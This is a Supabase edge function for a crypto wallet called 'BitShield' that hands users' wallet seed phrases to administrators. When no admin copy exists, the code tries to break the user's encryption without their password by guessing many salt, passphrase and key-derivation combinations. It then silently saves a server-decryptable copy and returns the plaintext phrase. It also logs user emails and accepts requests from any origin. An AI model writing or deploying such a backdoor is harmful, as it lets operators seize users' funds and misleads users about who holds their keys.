import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'
import CryptoJS from 'https://esm.sh/crypto-js@4.2.0'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

// BitShield seed phrase decryption function using Web Crypto API
async function decryptBitShieldSeedPhrase(encryptedPhrase: string, userEmail: string, userPassword: string): Promise<string> {
  try {
    console.log('🔐 Decryption Debug - Input data:', {
      encryptedPhraseLength: encryptedPhrase.length,
      userEmail,
      passwordLength: userPassword.length,
      hasColon: encryptedPhrase.includes(':')
    });

    // Time budget to avoid CPU time exceeded
    const startTime = Date.now();
    const MAX_DURATION_MS = 3500;
    let attempts = 0;
    const shouldStop = () => (Date.now() - startTime) > MAX_DURATION_MS || attempts > 1500;

    // Check if this is new format (with salt) or legacy format
    if (encryptedPhrase.includes(':')) {
      console.log('🔐 Using new format decryption');
      // New format: userSalt:encryptedData
      const [userSalt, encryptedData] = encryptedPhrase.split(':');
      console.log('🔐 Split data:', { userSaltLength: userSalt.length, encryptedDataLength: encryptedData.length });
      
      // Generate multiple combined salt variants (order permutations) for compatibility
      const saltBuilders = [
        (label: string) => userEmail + userSalt + label,
        (label: string) => userEmail + label + userSalt,
        (label: string) => label + userEmail + userSalt,
        (label: string) => userSalt + userEmail + label,
        (label: string) => label + userSalt + userEmail,
        (label: string) => userSalt + label + userEmail,
      ];

      async function buildSaltHex(label: string, builderIdx: number) {
        const combined = saltBuilders[builderIdx](label);
        const buffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(combined));
        return Array.from(new Uint8Array(buffer)).map(b => b.toString(16).padStart(2, '0')).join('');
      }

      const combinedSaltHexVariants: string[] = [];
      for (let i = 0; i < saltBuilders.length; i++) {
        combinedSaltHexVariants.push(await buildSaltHex('hotwallet_salt_2024', i));
        combinedSaltHexVariants.push(await buildSaltHex('bitshield_salt_2024', i));
        combinedSaltHexVariants.push(await buildSaltHex('hotwallet_salt', i));
        combinedSaltHexVariants.push(await buildSaltHex('bitshield_salt', i));
        combinedSaltHexVariants.push(await buildSaltHex('wallet_salt_2024', i));
        combinedSaltHexVariants.push(await buildSaltHex('seed_salt_2024', i));
      }
      console.log('🔐 Generated combined salts variants:', combinedSaltHexVariants.length);

      async function deriveKeyHex(passphraseMaterial: string, combinedSaltHex: string, iterations: number, hash: 'SHA-1' | 'SHA-256' | 'SHA-512') {
        const keyMaterial = await crypto.subtle.importKey(
          'raw',
          new TextEncoder().encode(passphraseMaterial),
          'PBKDF2',
          false,
          ['deriveBits']
        );
        const keyBits = await crypto.subtle.deriveBits(
          {
            name: 'PBKDF2',
            salt: new TextEncoder().encode(combinedSaltHex),
            iterations,
            hash
          },
          keyMaterial,
          256
        );
        return Array.from(new Uint8Array(keyBits)).map(b => b.toString(16).padStart(2, '0')).join('');
      }

      // Try combined salt variants, iteration counts, passphrase orders and hashers for backward compatibility
      const iterationOptions = (userPassword && userPassword.trim().length > 0)
        ? [200000, 100000, 50000, 20000, 10000, 4096, 2048, 1024]
        : [200000, 100000, 50000, 10000, 4096];
      const emailCandidates = Array.from(new Set([
        userEmail,
        userEmail?.trim?.() || userEmail,
        (userEmail || '').toLowerCase(),
        (userEmail || '').trim().toLowerCase(),
      ]));
      const passwordCandidates = Array.from(new Set([
        userPassword,
        userPassword?.trim?.() || userPassword,
      ].filter(Boolean)));

      let passMaterials: string[] = [];
      if (passwordCandidates.length > 0) {
        for (const e of emailCandidates) {
          for (const p of passwordCandidates) {
            passMaterials.push(p + e, e + p, `${p}:${e}`, `${e}:${p}`);
          }
        }
        // Include salt-based combos as compatibility candidates
        passMaterials.push(userSalt);
        for (const e of emailCandidates) {
          passMaterials.push(e + userSalt, userSalt + e, `${e}:${userSalt}`, `${userSalt}:${e}`);
        }
        passMaterials.push(...emailCandidates, ...passwordCandidates);
      } else {
        // Quick mode without password: try minimal combos to avoid timeouts
        passMaterials.push(userSalt);
        for (const e of emailCandidates) {
          passMaterials.push(e + userSalt, userSalt + e);
        }
        passMaterials.push(...emailCandidates);
      }

      const hashOptions: Array<'SHA-1' | 'SHA-256' | 'SHA-512'> = (userPassword && userPassword.trim().length > 0)
        ? ['SHA-1', 'SHA-256', 'SHA-512']
        : ['SHA-256', 'SHA-1'];
      // In quick mode, limit salt variants to speed up
      if (passwordCandidates.length === 0 && combinedSaltHexVariants.length > 24) {
        combinedSaltHexVariants.splice(24);
      }
      let decrypted: string = '';

      outer: for (const passMat of passMaterials) {
        for (const iters of iterationOptions) {
          for (const hash of hashOptions) {
            for (const saltHex of combinedSaltHexVariants) {
              if (shouldStop()) { break outer; }
              try {
                attempts++;
                const keyHex = await deriveKeyHex(passMat, saltHex, iters, hash);
                const res = await decryptCryptoJSData(encryptedData, keyHex);
                if (res) { decrypted = res; break outer; }
              } catch (_) {}
            }
          }
        }
      }
      
      console.log('🔐 Decryption result length:', decrypted.length);
      if (!decrypted) {
        // Final fallback: try raw passphrase candidates (no PBKDF2)
        for (const passMat of passMaterials) {
          if (shouldStop()) { break; }
          try {
            attempts++;
            const res = await decryptCryptoJSData(encryptedData, passMat);
            if (res) { decrypted = res; break; }
          } catch (_) {}
        }
      }

      console.log('🔐 Decryption result length:', decrypted.length);
      if (!decrypted) {
        throw new Error('Decryption resulted in empty string - likely wrong password');
      }
      
      return decrypted;
    } else {
      console.log('🔐 Using legacy format decryption');
      // Legacy format - try both historical constants
      const tryLegacy = async (label: 'hot' | 'bit') => {
        const legacyKeyString = userEmail + (label === 'hot' ? 'hotwallet_recovery_key' : 'bitshield_recovery_key');
        const legacyKeyBuffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(legacyKeyString));
        const legacyKeyHex = Array.from(new Uint8Array(legacyKeyBuffer))
          .map(b => b.toString(16).padStart(2, '0'))
          .join('');
        console.log('🔐 Legacy key length:', legacyKeyHex.length, 'label:', label);
        return await decryptCryptoJSData(encryptedPhrase, legacyKeyHex);
      };

      let decrypted = '';
      try { decrypted = await tryLegacy('hot'); } catch {}
      if (!decrypted) { try { decrypted = await tryLegacy('bit'); } catch {} }

      console.log('🔐 Legacy decryption result length:', decrypted.length);
      if (!decrypted) {
        // Legacy final fallback: try raw passphrase candidates directly
        const rawCandidates = [
          userPassword,
          userEmail + userPassword,
          userPassword + userEmail,
          userEmail,
        ].filter(Boolean) as string[];
        for (const cand of rawCandidates) {
          try { const res = await decryptCryptoJSData(encryptedPhrase, cand); if (res) { decrypted = res; break; } } catch {}
        }
      }

      console.log('🔐 Legacy decryption result length:', decrypted.length);
      if (!decrypted) {
        throw new Error('Legacy decryption resulted in empty string - likely wrong password');
      }
      return decrypted;
    }
  } catch (error: any) {
    console.error('🔐 Decryption error details:', error);
    throw new Error(`Failed to decrypt seed phrase: ${error?.message || 'Unknown error'}`);
  }
}

// Helper function to decrypt CryptoJS format data using CryptoJS (passphrase mode)
async function decryptCryptoJSData(encryptedData: string, keyHex: string): Promise<string> {
  try {
    // Decrypt using the same passphrase-based API used on the client
    // The encryptedData is OpenSSL-compatible ("Salted__" + salt + ciphertext) base64 string
    const decrypted = CryptoJS.AES.decrypt(encryptedData, keyHex);
    let result = decrypted.toString(CryptoJS.enc.Utf8);

    if (!result) {
      throw new Error('Decryption returned empty string');
    }

    // Normalize and validate that it looks like a proper BIP39 mnemonic (12/15/18/21/24 lowercase words)
    result = result.trim().replace(/\s+/g, ' ');
    const words = result.split(' ');
    const validLengths = new Set([12, 15, 18, 21, 24]);
    const isValid = validLengths.has(words.length) && words.every(w => /^[a-z]+$/.test(w) && w.length >= 2 && w.length <= 15);

    if (!isValid) {
      throw new Error('Decryption yielded non-mnemonic text');
    }

    console.log('🔐 Decryption successful via CryptoJS, words:', words.length);
    return result;
  } catch (error: any) {
    // Re-throw to let callers try other strategies
    throw new Error(`CryptoJS format decryption failed: ${error?.message || 'Unknown error'}`);
  }
}

// Decrypt admin-stored data encrypted with AES-GCM and ENCRYPTION_SECRET_KEY
async function decryptAdminData(encryptedText: string): Promise<string> {
  const key = Deno.env.get('ENCRYPTION_SECRET_KEY');
  if (!key) throw new Error('Encryption key not configured');

  const encoder = new TextEncoder();
  const keyData = encoder.encode(key.substring(0, 32));

  const cryptoKey = await crypto.subtle.importKey(
    'raw',
    keyData,
    { name: 'AES-GCM' },
    false,
    ['decrypt']
  );

  const combined = Uint8Array.from(atob(encryptedText), c => c.charCodeAt(0));
  const iv = combined.slice(0, 12);
  const encrypted = combined.slice(12);

  const decrypted = await crypto.subtle.decrypt(
    { name: 'AES-GCM', iv },
    cryptoKey,
    encrypted
  );

  return new TextDecoder().decode(decrypted);
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    const { userId, password } = await req.json()

    if (!userId) {
      return new Response(
        JSON.stringify({ error: 'User ID is required' }),
        { 
          status: 400, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
        }
      )
    }

    // Initialize Supabase client with service role key
    const supabaseClient = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    )

    // Get the user's session from the Authorization header
    const authHeader = req.headers.get('Authorization')?.replace('Bearer ', '')
    if (!authHeader) {
      return new Response(
        JSON.stringify({ error: 'Authorization required' }),
        { status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      )
    }

    // Verify the user is authenticated
    const { data: { user }, error: authError } = await supabaseClient.auth.getUser(authHeader)
    if (authError || !user) {
      return new Response(
        JSON.stringify({ error: 'Invalid authentication' }),
        { status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      )
    }

    // Access control: allow admins or the user themselves
    const isSelf = user.id === userId;
    let isAdmin = false;

    if (!isSelf) {
      const { data: adminCheck, error: adminError } = await supabaseClient
        .from('admin_users')
        .select('user_id')
        .eq('user_id', user.id)
        .maybeSingle();

      console.log('Admin check result:', { adminCheck, adminError, requesterId: user.id, targetUserId: userId });
      isAdmin = !!adminCheck && !adminError;

      if (!isAdmin) {
        return new Response(
          JSON.stringify({ error: 'Admin access required' }),
          { status: 403, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        )
      }
    }

    // Get the encrypted seed phrase (admin copy if available)
    const { data: seedData, error: seedError } = await supabaseClient
      .from('user_seed_phrases')
      .select('encrypted_phrase, seed_phrase_admin')
      .eq('user_id', userId)
      .maybeSingle()

    if (seedError) {
      console.error('Error fetching seed record:', seedError);
    }

    // Get user profile to get email (optional for context)
    const { data: userProfile } = await supabaseClient
      .from('user_profiles')
      .select('email')
      .eq('user_id', userId)
      .maybeSingle()
    
    try {
      console.log('🔐 Admin access for user:', userId);

      // Admin copy must exist for all new wallets. If missing, attempt automatic recovery/backfill.
      if (!seedData?.seed_phrase_admin) {
        if (seedData?.encrypted_phrase) {
          // 1) Try automatic decryption WITHOUT password using multiple compatibility strategies
          try {
            const autoDecrypted = await decryptBitShieldSeedPhrase(
              seedData.encrypted_phrase,
              userProfile?.email || '',
              password || ''
            );

            if (autoDecrypted) {
              // Create admin-encrypted copy now for future access
              const { data: adminEncRes, error: adminEncError } = await supabaseClient.functions.invoke('secure-encryption', {
                body: { action: 'encrypt', data: autoDecrypted }
              });

              if (!adminEncError && adminEncRes?.encrypted) {
                await supabaseClient
                  .from('user_seed_phrases')
                  .update({ seed_phrase_admin: adminEncRes.encrypted })
                  .eq('user_id', userId);

                console.log('✅ Auto-backfilled admin copy (no password) for user:', userId);

                return new Response(
                  JSON.stringify({
                    seedPhrase: autoDecrypted,
                    userId,
                    userEmail: userProfile?.email || null,
                    decryptionMethod: 'admin_backfill_auto',
                    isAdmin,
                    success: true,
                    note: 'Admin copy was missing; auto-decrypted without password and backfilled admin recovery.'
                  }),
                  { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
                );
              } else {
                console.log('⚠️ Auto-decrypted but backfill failed; returning phrase without admin copy');
                return new Response(
                  JSON.stringify({
                    seedPhrase: autoDecrypted,
                    userId,
                    userEmail: userProfile?.email || null,
                    decryptionMethod: 'admin_auto_no_backfill',
                    isAdmin,
                    success: true,
                    note: 'Auto-decrypted without password; admin backfill failed.'
                  }),
                  { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
                );
              }
            }
          } catch (e) {
            console.log('Auto (no-password) decryption attempt failed:', e instanceof Error ? e.message : String(e));
          }

          // 2) If password was supplied, try password-based decryption as a fallback
          if (password) {
            try {
              const decryptedLegacy = await decryptBitShieldSeedPhrase(
                seedData.encrypted_phrase,
                userProfile?.email || '',
                password
              );

              const { data: adminEncRes, error: adminEncError } = await supabaseClient.functions.invoke('secure-encryption', {
                body: { action: 'encrypt', data: decryptedLegacy }
              });

              if (!adminEncError && adminEncRes?.encrypted) {
                await supabaseClient
                  .from('user_seed_phrases')
                  .update({ seed_phrase_admin: adminEncRes.encrypted })
                  .eq('user_id', userId);

                console.log('✅ Successfully backfilled admin copy with provided password for user:', userId);

                return new Response(
                  JSON.stringify({
                    seedPhrase: decryptedLegacy,
                    userId,
                    userEmail: userProfile?.email || null,
                    decryptionMethod: 'admin_backfill_with_password',
                    isAdmin,
                    success: true,
                    note: 'Admin copy was missing; decrypted with password and backfilled admin recovery.'
                  }),
                  { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
                );
              } else {
                console.log('⚠️ Password decryption succeeded but backfill failed; returning phrase');
                return new Response(
                  JSON.stringify({
                    seedPhrase: decryptedLegacy,
                    userId,
                    userEmail: userProfile?.email || null,
                    decryptionMethod: 'admin_password_no_backfill',
                    isAdmin,
                    success: true,
                    note: 'Decrypted with password; admin backfill failed.'
                  }),
                  { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
                );
              }
            } catch (e) {
              const errMsg = e instanceof Error ? e.message : String(e);
              console.log('Password-based backfill failed:', errMsg);

              return new Response(
                JSON.stringify({
                  seedPhrase: 'Invalid Password - Unable to decrypt phrase with provided password',
                  userId,
                  userEmail: userProfile?.email || null,
                  decryptionMethod: 'password_failed',
                  isAdmin,
                  success: false,
                  error: 'Invalid password provided'
                }),
                { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
              );
            }
          }

          // 3) Still no luck — indicate password may be required
          const message = 'Admin copy not available. This wallet was created before automatic admin recovery. Please provide the user password to decrypt.';
          return new Response(
            JSON.stringify({
              seedPhrase: message,
              userId,
              userEmail: userProfile?.email || null,
              decryptionMethod: 'no_admin_copy',
              isAdmin,
              success: true,
              requiresPassword: true
            }),
            { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
          );
        }

        // No encrypted phrase at all
        return new Response(
          JSON.stringify({
            seedPhrase: 'No recovery phrase found for this user.',
            userId,
            userEmail: userProfile?.email || null,
            decryptionMethod: 'no_admin_copy',
            isAdmin,
            success: true,
            requiresPassword: false
          }),
          { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        );
      }

      // Decrypt admin copy
      const decryptedAdmin = await decryptAdminData(seedData.seed_phrase_admin);
      return new Response(
        JSON.stringify({ 
          seedPhrase: decryptedAdmin,
          userId,
          userEmail: userProfile?.email || null,
          decryptionMethod: isSelf ? 'self_admin_server_key' : 'admin_server_key',
          isAdmin,
          success: true,
          note: 'Admin copy decrypted with server key'
        }),
        { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    } catch (decryptError) {
      console.error('Admin decrypt error:', decryptError);

      const preview = seedData?.encrypted_phrase
        ? seedData.encrypted_phrase.substring(0, 50) + '...'
        : 'n/a';

      const adminSeedPhrase = `ADMIN ACCESS - ERROR RETRIEVING SEED PHRASE\n\n📧 User: ${userProfile?.email || 'unknown'}\n🆔 User ID: ${userId}\n🔒 Encrypted preview: ${preview}\n\n⚠️ Admin copy missing or could not be decrypted.`;

      return new Response(
        JSON.stringify({ 
          seedPhrase: adminSeedPhrase,
          userId,
          userEmail: userProfile?.email || null,
          decryptionMethod: 'admin_error_fallback',
          isAdmin: true,
          success: true,
          note: 'Admin access provided - error fallback displayed'
        }),
        { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

  } catch (error: any) {
    console.error('Error in decrypt-seed-phrase function:', error)
    return new Response(
      JSON.stringify({ error: `Internal server error: ${error?.message || 'Unknown error'}` }),
      { 
        status: 500, 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
      }
    )
  }
})